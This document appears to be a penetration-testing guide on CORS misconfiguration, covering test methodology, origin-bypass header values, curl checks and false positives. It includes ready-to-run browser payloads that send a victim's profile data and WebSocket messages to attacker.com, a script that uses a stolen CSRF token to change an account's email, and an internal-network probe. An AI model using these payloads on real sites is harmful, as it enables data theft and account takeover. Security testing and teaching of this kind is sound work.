<cors_misconfiguration_guide>
<title>CORS MISCONFIGURATION</title>

<critical>Cross-Origin Resource Sharing (CORS) misconfigurations allow attackers to bypass the same-origin policy, enabling cross-site data theft, session hijacking, and unauthorized API access. Misconfigured CORS headers can turn a simple XSS or phishing page into a full account takeover vector.</critical>

<scope>
- Origin reflection vulnerabilities
- Null origin exploitation
- Wildcard origins with credentials
- Subdomain wildcards and regex bypasses
- Pre-flight bypass techniques
- Third-party origin trust issues
</scope>

<methodology>
1. Identify endpoints returning CORS headers (Access-Control-Allow-Origin).
2. Test origin reflection by submitting various Origin header values.
3. Check if credentials are allowed with reflected or weak origins.
4. Probe for null origin acceptance and subdomain wildcard patterns.
5. Verify if sensitive data or actions are accessible cross-origin.
</methodology>

<cors_headers>
<response_headers>
{% raw %}
# Key CORS response headers
Access-Control-Allow-Origin: https://example.com | * | null
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom-Header
Access-Control-Expose-Headers: X-Custom-Response-Header
Access-Control-Max-Age: 86400
{% endraw %}
</response_headers>

<dangerous_configurations>
{% raw %}
# 1. Origin reflection with credentials
Access-Control-Allow-Origin: [reflected from Origin header]
Access-Control-Allow-Credentials: true

# 2. Null origin allowed with credentials
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# 3. Wildcard with credentials (browser blocked, but backend misconfiguration)
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true  # This combination is invalid but indicates weak config

# 4. Subdomain wildcard via regex
Access-Control-Allow-Origin: https://evil.example.com  # When any subdomain is trusted

# 5. Protocol downgrade
Access-Control-Allow-Origin: http://example.com  # When https:// is expected
{% endraw %}
</dangerous_configurations>
</cors_headers>

<testing_techniques>
<origin_reflection>
{% raw %}
# Test with attacker-controlled origin
Origin: https://evil.com
Origin: https://attacker.example.com

# Test with target domain variations
Origin: https://sub.target.com
Origin: https://target.com.evil.com
Origin: https://targetcom.evil.com
Origin: https://target.com.attacker.com

# URL-based bypass attempts
Origin: https://target.com%60.evil.com
Origin: https://target.com%0d%0a.evil.com
{% endraw %}
</origin_reflection>

<null_origin>
{% raw %}
# Test null origin acceptance
Origin: null

# Null origin sources:
# - Sandboxed iframes: <iframe sandbox="allow-scripts" src="data:text/html,...">
# - Local file:// pages
# - Cross-origin redirects
# - data: URLs
# - blob: URLs (sometimes)

# Exploit via sandboxed iframe
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
        src="data:text/html,<script>
          fetch('https://target.com/api/user', {credentials: 'include'})
          .then(r => r.json())
          .then(d => fetch('https://attacker.com/log?data='+btoa(JSON.stringify(d))))
        </script>">
</iframe>
{% endraw %}
</null_origin>

<subdomain_bypass>
{% raw %}
# If target trusts *.target.com subdomains
# 1. Find XSS on any subdomain
# 2. Use that subdomain as origin

# Or if regex is weak:
Origin: https://evil-target.com           # Missing anchor
Origin: https://target.com.evil.com       # Suffix match
Origin: https://nottarget.com             # Substring match
Origin: https://target.com@evil.com       # URL parsing confusion
{% endraw %}
</subdomain_bypass>

<pre_flight_bypass>
{% raw %}
# Simple requests don't trigger pre-flight:
# - GET, HEAD, POST only
# - Only these headers: Accept, Accept-Language, Content-Language, Content-Type
# - Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain

# Bypass techniques:
# 1. Use POST with text/plain to avoid pre-flight
Content-Type: text/plain
{"action": "delete_account"}

# 2. Encode JSON as form data if backend parses both
Content-Type: application/x-www-form-urlencoded
json={"action":"delete"}

# 3. Use GET for state-changing operations (if backend allows)
{% endraw %}
</pre_flight_bypass>

<credential_tests>
{% raw %}
# Test with credentials
fetch('https://target.com/api/sensitive', {
  credentials: 'include',
  mode: 'cors'
}).then(r => r.json()).then(console.log)

# Check for:
# 1. Access-Control-Allow-Credentials: true
# 2. Specific origin (not wildcard) in Access-Control-Allow-Origin
# 3. Session cookies or auth headers sent cross-origin
{% endraw %}
</credential_tests>
</testing_techniques>

<exploitation_scenarios>
<data_theft>
{% raw %}
<!-- Steal user data from vulnerable API -->
<script>
  fetch('https://vulnerable.com/api/user/profile', {
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    // Exfiltrate sensitive data
    new Image().src = 'https://attacker.com/log?data=' + 
                      encodeURIComponent(JSON.stringify(data));
  });
</script>
{% endraw %}
</data_theft>

<session_hijacking>
{% raw %}
<!-- Extract session tokens or CSRF tokens -->
<script>
  fetch('https://vulnerable.com/api/csrf-token', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    // Use CSRF token to perform actions
    fetch('https://vulnerable.com/api/change-email', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': data.token
      },
      body: JSON.stringify({email: 'attacker@evil.com'})
    });
  });
</script>
{% endraw %}
</session_hijacking>

<internal_network_scan>
{% raw %}
<!-- Use CORS to probe internal network -->
<script>
  const internalHosts = [
    'http://192.168.1.1',
    'http://10.0.0.1',
    'http://localhost:8080',
    'http://internal-api.local'
  ];
  
  internalHosts.forEach(host => {
    fetch(host + '/api/status', {mode: 'cors'})
      .then(r => r.text())
      .then(data => {
        console.log(host + ' accessible: ' + data);
      })
      .catch(() => console.log(host + ' blocked'));
  });
</script>
{% endraw %}
</internal_network_scan>

<websocket_hijacking>
{% raw %}
<!-- CORS doesn't protect WebSocket by default -->
<script>
  // WebSocket doesn't use CORS; origin checking is manual
  const ws = new WebSocket('wss://vulnerable.com/socket');
  ws.onmessage = (e) => {
    fetch('https://attacker.com/log?ws=' + encodeURIComponent(e.data));
  };
</script>
{% endraw %}
</websocket_hijacking>
</exploitation_scenarios>

<bypass_techniques>
<regex_bypass>
{% raw %}
# Common regex vulnerabilities in origin validation
Origin: https://target.com.evil.com       # Missing $ anchor
Origin: https://eviltarget.com            # Missing ^ anchor  
Origin: https://target.com%00.evil.com    # Null byte
Origin: https://target.com\t.evil.com     # Tab character
Origin: https://TARGET.COM                # Case sensitivity
Origin: https://target.com:443@evil.com   # URL authority confusion
{% endraw %}
</regex_bypass>

<protocol_confusion>
{% raw %}
# Test protocol variations
Origin: http://target.com     # HTTP when HTTPS expected
Origin: https://target.com    # Standard
Origin: null                  # Null origin
Origin:                       # Empty origin (rare)
{% endraw %}
</protocol_confusion>

<vary_header_abuse>
{% raw %}
# Missing Vary: Origin can lead to cache poisoning
# 1. Attacker sends request with malicious Origin
# 2. Response cached with Access-Control-Allow-Origin: evil.com
# 3. Victim requests same resource, gets cached response
# 4. Victim's browser allows cross-origin access from evil.com

# Check for missing Vary header
curl -s -D- https://target.com/api/data \
  -H "Origin: https://evil.com" | grep -i vary
{% endraw %}
</vary_header_abuse>
</bypass_techniques>

<testing_automation>
{% raw %}
# Quick CORS test with curl
curl -s -D- https://target.com/api/endpoint \
  -H "Origin: https://evil.com" | grep -i "access-control"

# Test null origin
curl -s -D- https://target.com/api/endpoint \
  -H "Origin: null" | grep -i "access-control"

# Test with credentials
curl -s -D- https://target.com/api/endpoint \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=abc123" | grep -i "access-control"

# Automated testing script concept
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -s -D- https://target.com/api/endpoint \
    -H "Origin: $origin" | grep -i "access-control"
done
{% endraw %}
</testing_automation>

<validation>
1. Demonstrate origin reflection with attacker-controlled domain.
2. Confirm credentials are allowed (Access-Control-Allow-Credentials: true).
3. Show successful cross-origin data access with proof (user info, tokens).
4. Provide working PoC HTML that extracts sensitive data.
5. Document the exact origin that bypasses validation.
</validation>

<false_positives>
- CORS headers returned but credentials not allowed (low impact)
- Public APIs intentionally allowing cross-origin access
- Access-Control-Allow-Origin: * without credentials (expected for public data)
- Pre-flight blocking the actual attack request
- No sensitive data accessible via the vulnerable endpoint
</false_positives>

<impact>
- Sensitive data theft (PII, financial data, credentials)
- Session hijacking and account takeover
- CSRF-like attacks bypassing token validation
- Internal network reconnaissance
- API abuse and unauthorized actions
- Compliance violations (GDPR, PCI-DSS)
</impact>

<pro_tips>
1. Always test with credentials: 'include' to check credential handling.
2. Look for origin reflection in error responses as well as success responses.
3. Check multiple endpoints; CORS policies may vary across the application.
4. Test both pre-flight (OPTIONS) and actual requests; behavior may differ.
5. Use sandboxed iframes to generate null origin requests.
6. Check for Vary: Origin header to identify cache poisoning potential.
7. Look for CORS misconfigurations on CDN/proxy layers, not just application.
8. Test subdomains; XSS + CORS misconfiguration = full compromise.
9. Remember WebSocket connections don't use CORS; check for origin validation.
10. Document the full attack chain including how the victim reaches the exploit page.
</pro_tips>

<remember>CORS is a browser-enforced mechanism that can be bypassed through misconfiguration. The same-origin policy only protects against cross-origin reads when properly configured. Always validate the Origin header against an explicit allowlist and never reflect arbitrary origins when credentials are allowed.</remember>
</cors_misconfiguration_guide>
